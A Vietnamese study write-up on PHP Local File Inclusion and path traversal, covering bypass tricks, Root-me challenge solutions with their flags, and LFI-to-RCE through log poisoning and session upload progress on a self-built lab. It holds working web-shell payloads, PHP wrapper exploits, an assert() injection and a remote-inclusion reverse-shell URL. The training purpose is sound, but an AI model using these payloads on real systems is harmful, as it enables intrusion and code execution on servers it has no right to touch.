### Task 7: 
+ Nghiên cứu lổ hổng LFI
+ Sự khác biệt giữa LFI và Path traversal
+ Làm các challenge liên quan đến LFI + Path Traversal Trên Root-me
+ Nghiên cứu các kĩ thuật từ LFI đến RCE : Log poisoning, Session upload progress 
+ (Tự build challenge để demo)

# I. Local File Inclusion

## 1. Khái quát

Local file inclusion là một lỗ hổng nguy hiểm, nó cho phép tin tặc truy cập trái phép vào những tệp tin nhạy cảm của server hặc thực thi những đoạn mã độc bằng cách sử dụng chức năng include. Lỗ hổng xảy ra do cơ chế lọc đầu vào được thực hiện không tốt, giúp tin tặc có thể khai thác và chèn các tệp tin độc hại.Lỗ hổng được khai thác bằng cách sử dụng chức năng include(), nên do vậy để hiểu về lỗ hổng này thì trước tiên ta cùng đi tìm hiểu về chức năng include().

Include là một chức năng được sử dụng trong nhiều ngôn ngữ lập trình. Ví dụ khi ta sử dụng chức năng include ở file “x” để gọi file “y” thì nội dung của file y sẽ được insert vào nội dung của file x. Chức năng này giúp lập trình viên có thể tái sử dụng các chức năng đã được định nghĩa mà không cần code lại.

Ví dụ : Trong php ta có một trang list.php 

![image](https://hackmd.io/_uploads/r1ldjeFv6.png)

File list.php có thể được include vào bất kì file nào trong website. Ví dụ ta có một file index.php như sau:

![image](https://hackmd.io/_uploads/HJ3jsltw6.png)

Bây giờ thì file list.php đã được include vào trong trang index.php, và bất cứ khi nào trang index.php được truy cập thì nội dung trang list.php được copy vào trong trang index.php và thực thi chúng.

>Note ngoài ra còn có các lệnh khác như: include, require, include_once, require _ once , các lệnh này cho phép việc file hiện tại có thể gọi ra 1 file khác.

Dấu hiệu để nhận biết rằng trang web có thể tấn công file inclusion là đường link thường có dạng php?page=,hoặc php?file= .... Để biết trang web có bị lỗi này hay không ta chỉ cần thêm 1 dấu ' vào đường link , ví dụ như là php?page=' . Và trên trình duyệt sẽ có thông báo dạng : 

`Warning: Warning: include() [function.include]: Failed opening ''' for inclusion (include_path='.;C:\php5\pear') in C:\wamp\www\FI.php on line 40`


Ví dụ 1 source code có thể gây ra lỗi LFI:

```php=
<?php
    $page=$_GET['page'];
        if($page!==''){
            include($page);
        }else{
            include('index.php');
        }
?>
```

Đoạn code trên không có bất kì xử lí đầu vào nào, dẫn đến nếu ta thay đổi giá trị của biến $page thành 1 file hệ thống nào đó thì file đó sẽ được gọi ra bằng hàm include()
URL sẽ có dạng như sau:
`http://www.xyz.vn/?page=abc.php`
Lúc này ta sẽ thay đổi abc.php thành địa chỉ của bất kì file nào trên hệ thống.
`http://www.xyz.vn/?page=../../../../etc/passwd`

## 2. Các kiểu tấn công

Local file inclustion (LFI) là kĩ thuật đọc file trong hệ thống , lỗi này xảy ra thường sẽ khiến website bị lộ các thông tin nhảy cảm như là  /etc/shadow, /etc/passwd, php.ini, config.php, /apache/logs/error.log” hoặc “/apache/logs/access.log”…

### a. Poison NullByte:

%00 - null byte là kết quả mã hóa URL của một ký tự byte rỗng. Trong một số ứng dụng, chúng ta có thể sử dụng %00 để kết thúc sớm một chuỗi, do các thành phần sau kí tự %00 sẽ được hệ thống hiểu là các ký tự rỗng và sẽ không xử lý.

Xét source code sau : 

```php=
<?php

if (isset($_GET['file'])) {
    $file = $_GET['file'];
    $pattern = "/.html/";
    if (preg_match($pattern, $file)) {
        include($file);
    } else {
        echo "Chỉ được đọc các file có phần mở rộng là .html";
        exit();
    }
}

?>
```

- Hàm `preg_match($pattern, $subject, $matches)`: trong đó `$pattern` là biểu thức Regular Expression, `$subject` là chuỗi cần kiểm tra, `$matches` là kết quả trả về, đây là một tham số truyền vào ở dạng tham chiếu và có thể bỏ trống. Kết quả trả về của hàm sẽ là true nếu so khớp, false nếu không so khớp

Đoạn code trên sử dụng biểu thức chính quy (Regular Expressions) để kiểm tra chuỗi người dùng nhập có thỏa mãn điều kiện kết thúc bằng phần mở rộng `.html` hay không.

Như vậy payload chúng ta tạo ra cần có định dạng `X.html` . Có thể sử dụng ký tự null byte %00 chèn vào trước `.html`, thu được payload `X%00.html` . Khi đó hệ thống chỉ xử lý chuỗi đầu vào là X. Ví dụ : `/etc/passwd%00.html`

### b. Double Encoding

Kĩ thuật này cho phép ta bypass bộ lọc. Giả sử khi ta muốn mở file abc.php
`http://www.xyz.vn/?page=abc.php` thì nó hiện ra lỗi là dấu chấm đã bị filter.
Trường hợp này ta sẽ thử dùng đến kĩ thuật này. Dấu chấm là %2E, double encoding có nghĩa là ta sẽ encode dấu % 1 lần nữa–> %252E

### c. PHP wrapper:

**Wrapper php://filter**: Cho phép hacker có thể gọi file hệ thống và mã hóa base64 hoặc root13 kết quả trả về. Và cần phải decode để có thể đọc được nội dung. Ví dụ ta muốn đọc nội dung của file index.php : 

`?page=php://filter/read=string.rot13/resource=index.php`

`?page=php://filter/convert.base64-encode/resource=index.php`

`?page=pHp://FilTer/convert.base64-encode/resource=index.php`

**Wrapper zip**: tải lên 1 file zip chứa phpshell và thực thi nó, thường được dùng trong upload ảnh, media,…


- Tạo file php shell : `echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php; ` 
- Zip file php shell vừa tạo : `zip payload.zip payload.php;` 
- Đổi tên : mv payload.zip shell.jpg; 

 
Final payload : `http://example.com/index.php?page=zip://shell.jpg%23payload.php`

**Wrapper data//**:

Đây là một hàm thực thi code từ xa. Ta có thể inject đoạn mã mà mình muốn thực thi vào url.

- `?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>`
- `?page=data://text/plain,<?php phpinfo(); ?>`
- `page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls`
    - `// "<?php system($_GET['cmd']);?>"`


**Wrapper php://input**: cũng là một hàm thực thi code từ xa. Nó cho phép khai thác lỗ hổng LFI thông qua một yêu cầu POST và một biến sử dụng phương thức GET

`http://example.com/index.php?page=php://input&cmd=ls`

POST DATA: <?php system($_GET['cmd']); ?>

### d. Path and dot truncation:

Trong hầu hết các cài đặt PHP, một tên tệp dài hơn 4096 byte sẽ bị cắt bớt, do đó, bất kỳ ký tự vượt quá giới hạn này sẽ bị loại bỏ.

```
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```
### e. RFI (Remote File Inclusion) :

Nếu tồn lại lổ hổng LFI và trong cấu hình của file php.ini mà allow_url_open=On và allow_url_include=On thì có thể thực hiện gọi file từ xa và trong nội dung file này có thể chứa reverse shell
Dấu hiệu: URL có dạng như sau:

`http://example.com/index.php?page=http://attack.com/reverse_shell.php`

## 3. Khắc Phục Lỗ Hổng File Inclusion

- Kiểm tra chặt chẽ các file được include.

- Hạn chế sử dụng include.

- Với các thông tin được nhập từ bên ngoài, trước khi đưa vào hàm cần được kiểm tra kỹ lưỡng:

Chỉ chấp nhận kí tự và số cho tên file (A-Z 0–9). Blacklist toàn bộ kí tự đặc biệt không được sử dụng.

Giới hạn API cho phép việc include file từ một chỉ mục xác định nhằm tránh directory traversal.

## 4. So sánh LFI và Path traversal



| Tấn công            | Mô tả                                                                                                                                                                   |
|---------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| LFI                 | LFI là kỹ thuật tấn công khi kẻ tấn công sử dụng lỗ hổng trong ứng dụng web để đọc các file cục bộ trên máy chủ web, thường là các files cấu hình hay source của ứng dụng web đó. Khi kẻ tấn công có thể đọc được các file này, họ có thể tìm ra các lỗ hổng tiềm năng khác hoặc sử dụng thông tin này để tiến hành các cuộc tấn công khác. |
| Path Traversal      | Path Traversal là kỹ thuật tấn công khi kẻ tấn công sử dụng các ký tự đặc biệt để truy cập đến các files và thư mục bên ngoài thư mục root của ứng dụng web. Khi kẻ tấn công có thể truy cập được các tệp tin và thư mục bên ngoài thư mục root này, họ có thể đọc hoặc sửa đổi các files quan trọng trên máy chủ web, thực hiện các cuộc tấn công khác hoặc thậm chí kiểm soát máy chủ web. |
| Điểm chung          | Cả LFI và Path Traversal đều liên quan đến việc đọc file và thư mục bên trong máy chủ web. Về tác hại thì cả 2 đều có thể dẫn đến việc tiết lộ thông tin nhạy cảm, mất dữ liệu và mất kiểm soát về hệ thống.                                                  |
| Khác nhau           | LFI tập trung vào việc đọc các files cục bộ và có thể thực thi mã độc trong máy chủ web, trong khi Path Traversal tập trung vào việc truy cập đến các files và thư mục bên ngoài thư mục gốc của ứng dụng web.                                   |

# II. Root-me Challenges

## [1. Directory traversal](https://www.root-me.org/en/Challenges/Web-Server/Directory-traversal)

![image](https://hackmd.io/_uploads/ByM43SYP6.png)

![image](https://hackmd.io/_uploads/S1sU2jFDa.png)


Xem sơ qua thì thấy trên URL có param `?galerie` , thử với payload `../` thì thấy xuất hiện một thư mục `galerie` 

![image](https://hackmd.io/_uploads/B11lhotPT.png)

Thử truy cập thì bị cấm 

![image](https://hackmd.io/_uploads/Sy-f2iFPp.png)

Thử lại với payload `./` để chỉ thử mục hiện tại thì thấy có một thư mục lạ xuất hiện

![image](https://hackmd.io/_uploads/BJoOCitD6.png)


Yeah và truy cập vào vẫn bị cấm

![image](https://hackmd.io/_uploads/ByA8uoYwa.png)

Thử truy cập thư mục đó thông qua param thì `?galerie?=/86hwnX2r` thì bùm thấy được `password.txt`

![image](https://hackmd.io/_uploads/HkdTToKvp.png)

Truy cập src ta được flag

![image](https://hackmd.io/_uploads/BkaeCoYDT.png)

Flag : kcb$!Bx@v4Gs9Ez

## [2. PHP - assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)

![image](https://hackmd.io/_uploads/H14P-htwT.png)

![image](https://hackmd.io/_uploads/rkLtW3twT.png)

Để ý thấy trang web có param `?page=` và vì đề bài bảo là đọc file `.passwd` nên thử payload`../.passwd` vào thì hiện ra thông báo lỗi 

![image](https://hackmd.io/_uploads/SyYBbpFPT.png)


Ở thông báo lỗi chúng ta có 2 lệnh trong PHP được sử dụng là assert() và strpos(). Trong đó hàm assert() kiểm tra đầu vào và trả về giá trị bool. Nếu kết quả là fallse thì nó sẽ thực hiện hành động thích hợp. Còn hàm strpos() dùng để tìm vị trí xuất hiện đầu tiên của chuỗi con trong chuỗi cha. Code PHP của đoạn này có thể là:

`assert("strpos('includes/$file.php', '..') === false") or die("Detected hacking attempt!");`
 
 Vì `$file` ta có thể kiểm soát được nên ta có thể chỉnh payload vào`$file` như sau : $file = `ko_ton_tai','nothing') or system('cat .passwd') ; //`

Khi đó code sẽ trở thành :
assert("strpos('includes/==ko_ton_tai','nothing') or system('cat .passwd') ; //==.php', '..') === false") or die("Detected hacking attempt!");

- Kí tự `//` để comment phía sau lại

Kết quả : x4Ss3rT1nglSn0ts4f3A7A1Lx

![image](https://hackmd.io/_uploads/S1RQDpYva.png)

Flag : x4Ss3rT1nglSn0ts4f3A7A1Lx
 
## [3. PHP - Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)

![image](https://hackmd.io/_uploads/HkwU3TFwp.png)

![image](https://hackmd.io/_uploads/SkPdhaYw6.png)

Để ý trên URl ta thấy param `?inc=` và để bài gợi ý ta là dùng php filters nên ta sẽ sử dụng payload : 

`php://filter/convert.base64-encode/resource=`

Cho phép chúng ta đọc bất kì file php nào. Tuy nhiên chúng sẽ được mã hóa base-64. Và chúng ta phải decode nó để có thể xem source các file

Đầu tiên thử với file `login.php`

![image](https://hackmd.io/_uploads/H1l4ApKDp.png)


Decode base64 

![image](https://hackmd.io/_uploads/H1HURptPa.png)


Ta thấy trong file `login.php` có include `config.php` , nên ta thử xem source của `config.php`

![image](https://hackmd.io/_uploads/BJFpRTKwp.png)

Decode base64

![image](https://hackmd.io/_uploads/r1Bg1Ctwa.png)

Tìm được mật khẩu rồi , submit thôi

Flag : DAPt9D2mky0APAF


## [4. PHP - Path Truncation](https://www.root-me.org/en/Challenges/Web-Server/PHP-Path-Truncation)

![image](https://hackmd.io/_uploads/ryuhM0tPa.png)

![image](https://hackmd.io/_uploads/HJ-LX0tDT.png)

![image](https://hackmd.io/_uploads/BksOQ0KD6.png)

Nhiệm vụ của ta là truy cập được vào administration’s zone.

Để ý trên URL ta thấy có param `?page=home` và không có phần đuôi php, nên chắc chương trình sẽ tự động thêm phần đuôi php vào. Ví dụ : 

```php=
if(isset($_GET['page']) 
{     
    include($_GET['page'].".php");
}
```

Mà target của ta là `admin.html` , khi truy cập sẽ tự động thêm extension trở thành `admin.html.php` -> file không tồn tại

Thử với `%00` (NULL BYTE) nhưng không trả về gì , có lẽ đã bị filter

Nhìn vào đề bài và tìm hiểu một chút về PHP - Path Trunction thì trong hầu hết các cài đặt PHP, một tên tệp dài hơn 4096 byte sẽ bị cắt bớt, do đó, bất kỳ ký tự vượt quá giới hạn này sẽ bị loại bỏ.

Do vậy payload sẽ là : 
`a/../admin.html/./././[ADD MORE]/././.`
- `./` để chỉ thư mục hiện tại
- Thêm vào một thư mục `a` không tồn tại để chuyển hướng tấn công tránh lỗi từ server
- Dùng python để tạo payload như sau : `print('a/../admin.html'+'/.'*2040)`

Kết quả : 

![image](https://hackmd.io/_uploads/Bk1mWxcPp.png)

Flag : 110V3TrUnC4T10n

## [5. Local File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)

![image](https://hackmd.io/_uploads/BJLjvO9v6.png)

Dạo vòng trang web thì ta phát hiện được 2 param đó là `files` và `f` có chức năng in ra source code.
- `files` là thư mục
- `f` là file

![image](https://hackmd.io/_uploads/r1b5wu5Dp.png)

Thử chuyển sang admin thì bắt đăng nhập username , password . 

![image](https://hackmd.io/_uploads/BkqwddqDT.png)


Nhấn cancel để hủy thì trang web chuyển sang thư mục admin

![image](https://hackmd.io/_uploads/HkZS_O9v6.png)

Vậy là có thư mục admin nên ta sẽ dùng payload như sau : files=../admin&f=index.php

- Vì lúc đầu ta đang ở trong thư mục `sysadm` nên ta cần lùi lại một thư mục bằng `../`

Kết quả ta thấy được password của admin

![image](https://hackmd.io/_uploads/ryJGtd9DT.png)

Flag : OpbNJ60xYpvAQU8

## [6. Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)

![image](https://hackmd.io/_uploads/SJIXqOcw6.png)

![image](https://hackmd.io/_uploads/SJN89dqDa.png)

Nhìn vào trang web ta dễ thấy được param `?page=` bị LFI . Đề bài bảo ta đọc file source code nên ta thử đọc file `home` trước xem sao.

Mình sẽ sử dụng filter stream wrapper của PHP sau để đọc source code dưới dạng base64, đầu tiên thử với file home : 

`?page=php://filter/convert.base64-encode/resource=home`

Thì nhận về thông báo 

![image](https://hackmd.io/_uploads/SyNfidcwa.png)

Có vẻ đã bị filter, nhìn vào đề bài tên là double encode , cho nên mình thử đem payload trên đi url encode 2 lần các kí tự `.`  `/` `:`  `=` `:` `-` : 

`php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dhome`

Kêt quả : 

![image](https://hackmd.io/_uploads/S1XKeF9Dp.png)

Đem đi decode 

![image](https://hackmd.io/_uploads/rJs5xFqDT.png)

Nhưng không có gì , thấy trong file có include("conf.inc.php")

Nên ta thử đọc source của file này với payload sau : 

`php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf%252Einc%252Ephp`

Nhận về thông báo lỗi sau 

![image](https://hackmd.io/_uploads/SyVrbK9DT.png)

Từ thông báo lỗi trên thì ta thấy rằng trang web sẽ tự động thêm `.inc.php` vào cuối , cho nên ta chỉ cần ghi conf là được 

`php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf`

Kết quả : 

![image](https://hackmd.io/_uploads/ByPlMt9v6.png)


Decode base64 , ta nhận được flag : 

![image](https://hackmd.io/_uploads/SJGRZKqDT.png)

Flag : Th1sIsTh3Fl4g!

## [7. Local File Inclusion - Wrappers](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Wrappers)

![image](https://hackmd.io/_uploads/ryUkgn5Dp.png)

![image](https://hackmd.io/_uploads/HyLWx2cwp.png)

Trang web có chức năng upload file và thử up load một file `php` thì nhận thông báo chỉ nhần file ảnh `JPG`

![image](https://hackmd.io/_uploads/Sy1Il39Pa.png)

Up load một file ảnh bình thường lên 

![image](https://hackmd.io/_uploads/rJ-cgh9wT.png)

Ta thấy trên URL có 2 tham số param `?page=&id=` , check source để xem đường dẫn của ảnh vừa upload

![image](https://hackmd.io/_uploads/rk1--n5wp.png)

Ảnh được lưu với một cái tên ngẫu nhiên vào thư mục `tmp/upload`

Dựa vào tên đề bài thì ý tưởng để LFI bài này là dựa vào Wrappers PHP. Ý tưởng của bài này là dùng zip://shell.jpg%23payload.php : 

- Bước 1 : tạo một file `php` để xem source code của index.php
 ![image](https://hackmd.io/_uploads/S163D35PT.png)


- Bước 2 : Tạo một file zip chứa `a.php`
 ![image](https://hackmd.io/_uploads/ryNtX39Pp.png)

- Bước 3 : Đổi tên file zip đó thành `.jpg` (cái extension không quan trọng vì các byte header của file sẽ cho OS biết định dạng chính xác của file)
 ![image](https://hackmd.io/_uploads/HJzgE29D6.png)

- Bước 4 : Upload
![image](https://hackmd.io/_uploads/ryIUNh5vp.png)

- Bước 5 : Truy cập bằng `zip://tmp/upload/EmC31zwa7.jpg%23a` (ở đây ta không cần thêm đuôi `.php` bởi vì trang web sẽ tự động thêm vào sẽ thành a.php) 

Kết quả : 

![image](https://hackmd.io/_uploads/Bku4HhcP6.png)

Yeah trong file index.php không có flag , và nếu dùng hàm system() sẽ bị filter . Sau khi tìm hiểu thì mình biết được trong php có hàm [`scandir()`](https://vietjack.com/php/ham_scandir_trong_php.jsp) trả về một mảng chứa tên các files và thư mục, bao gồm cả các file ẩn và thư mục ẩn.

Vậy ta sửa file a.php thành như sau
![image](https://hackmd.io/_uploads/ryy6L2qvp.png)

Làm các bước tương tự như trên và upload ta được kết quả 

![image](https://hackmd.io/_uploads/Sk5Vvn5DT.png)

Ta thấy có một file tên là `flag-mipkBswUppqwXlq9ZydO.php`

Tiếp tục ta sẽ show_source() ra xem 
![image](https://hackmd.io/_uploads/B1tyOncwa.png)

Kết quả ta có được flag :

![image](https://hackmd.io/_uploads/Bym8_nqva.png)

Flag : lf1-Wr4pp3r_Ph4R_pwn3d

## [8. Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)

![image](https://hackmd.io/_uploads/S1M2dn5wp.png)

![image](https://hackmd.io/_uploads/ry4pYn5Dp.png)

Để ý trên URL có param `?lang=` và tên bài là Remote File Inclusion nên mình thử với load trang `https://www.google.com/` xem thì thấy thông báo lỗi 

![image](https://hackmd.io/_uploads/HyVwqnqwp.png)

Có vẻ như trang web sẽ tự động thêm đuôi `_lang.php` vào . Do vậy ta sẽ lên trang `gist.github.com` tạo một file tên là `a_lang.php` 

![image](https://hackmd.io/_uploads/S1FQs39Pa.png)

Payload cuối cùng sẽ là đường link tới code ta vừa tạo : `?lang=https://gist.githubusercontent.com/tadokun468/d7fd82c61d53e49e023792d58339e18a/raw/11fb55cefb873d4e60cd4794117a859219938c2b/a`

- Vì trang web sẽ tự động thêm phần extension nên trong đường link ta chỉ cần tên file là `a`  

Kết quả : 

![image](https://hackmd.io/_uploads/B1Lb23cw6.png)

Flag : R3m0t3_iS_r3aL1y_3v1l

# III. Từ LFI đến RCE

## 1. LFI to RCE via Log poisoning

Giả sử ta đang khai thác một máy chủ Apache bình thường. Theo mặc định, nó tạo ra hai tệp nhật ký được gọi là access_log và error_log trên máy chủ. Nếu ta giả mạo các bản ghi đó, thì có thể tải lên thành công mã PHP của riêng mình trên máy chủ. Những file đó có thể được lưu ở các địa chỉ sau `/var/log/apache2`

Có 2 cách để khai thác những file này tùy thuộc vào ta chọn file `access.log` hay `error.log`

### a. RCE via access.log

Poison the User-Agent in access logs:

![image](https://hackmd.io/_uploads/HywaoWowT.png)



Lưu ý: Các bản ghi (logs) sẽ thêm ký tự escape (`\`) vào dấu nháy kép nên hãy sử dụng dấu nháy đơn cho chuỗi trong code PHP payload.

Bây giờ truy cập access.log thông qua LFI và thực thi command

![image](https://hackmd.io/_uploads/HkTJ2-jPa.png)

### b. RCE via error.log
Ví dụ ta sử dụng file `error.log`. Khi ta nhập vào 1 địa chỉ không tồn tại thì nó sẽ được lưu lại ở file `error.log`, trường hợp này giả sử ta sử dụng file `/var/log/apache2/error.log`
`http://www.xyz.com/&lt;<? php system($_GET['cmd']) ?>` . Hiển nhiên sẽ trả về lỗi 404.
Từ đó ta có thể thực hiện remote code.
`http://www.xyz.com/ ?page=../../../../var/log/apache2/error.log%00&cmd=ls`

## 2. LFI to RCE via Session upload progress

Bản chất của kỹ thuật là chèn shell vào file session ngay cả khi PHP không tự tạo file session.

Để khai thác kỹ thuật này phụ thuộc vào vài cấu hình trong PHP cụ thể là php.ini:

- `session.auto_start = Off`: PHP sẽ không tạo session và ngược lại nếu là `On` sẽ tạo session mà không cần thực thi `session_start()`.

- `session.upload_progress.enabled = On`: Khi upload file thì PHP sẽ lưu thông tin thông qua session.

- `session.upload_progress.cleanup = On`: Sau khi upload file thì session file sẽ được xóa lập tức. Mặc định cấu hình này là `On`. Vậy dùng race condition để bypass cái này. Tham khảo cách bypass race condition tại [đây](https://clbuezzz.wordpress.com/2022/01/08/tu-lfi-den-rce/?fbclid=IwAR2DVdDZIgrBvKd8_Fxyr_KYRFXsA1PDPqC-x-pLOuUz1fLs1v3pEWPeCFs) và [đây](https://clbuezzz.wordpress.com/2022/01/09/buuctf-web-challengephan-17/)

- `session.upload_progress.prefix = "upload_progress_"`: Sử dụng chuỗi "upload_progress_" làm prefix trong file session.

- `session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"`: Khi xuất hiện trong form sẽ kiểm soát được giá trị bên trong file session.


File session sẽ được tạo vào thư mục theo cấu hình session.save_path: thường là `/tmp/sess_[SESSIONID]` hoặc là `/var/lib/php/sessions/sess_[SESSIONID]`

```bash=
$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange'
$ ls -a /var/lib/php/sessions/
. ..
$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -d 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'
$ ls -a /var/lib/php/sessions/
. ..
$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'  -F 'file=@/etc/passwd'
$ ls -a /var/lib/php/sessions/
. .. sess_iamorange

In the last example the session will contain the string blahblahblah
```

# IV. Demo Lab

## 1. LFI to RCE via Log

![image](https://hackmd.io/_uploads/SkpzNSovp.png)

Trang web có chức năng in ra nickname người dùng , trên URL có bị lổ hổng LFI ở param `?files`

Test với file access.log

![image](https://hackmd.io/_uploads/Bkp_LBsv6.png)

Bây giờ thử inject `<?php system('id'); ?>` vào User-Agent: 

![image](https://hackmd.io/_uploads/SyZDwBswp.png)

Và truy cập `/var/log/apache2/access.log` ta được

![image](https://hackmd.io/_uploads/SksAPrjvT.png)

Vậy là ta đã RCE thành công

## 2. LFI to RCE via Session

![image](https://hackmd.io/_uploads/B1gl5BjPp.png)

![image](https://hackmd.io/_uploads/rkLE9Bsw6.png)



Vẫn là trang web trên , bây giờ ta sẽ test sessions file

Đầu tiên kiểm tra session

![image](https://hackmd.io/_uploads/HJPtqrowT.png)

Truy cập `/var/lib/php/sessions/sess_jtium04gugnafqueptnh0n74nh`

![image](https://hackmd.io/_uploads/B1GDjrsPT.png)

Bây giờ ta sẽ exploit bằng cách inject code php vào form

![image](https://hackmd.io/_uploads/ByuyRBoPT.png)

![image](https://hackmd.io/_uploads/HkD7RBsvT.png)


Kiểm tra file session `/var/lib/php/sessions/sess_139k2hstbesrvothc34e9kasv1`

Kết quả : 

![image](https://hackmd.io/_uploads/r1wxJIjv6.png)

Đã RCE thành công!

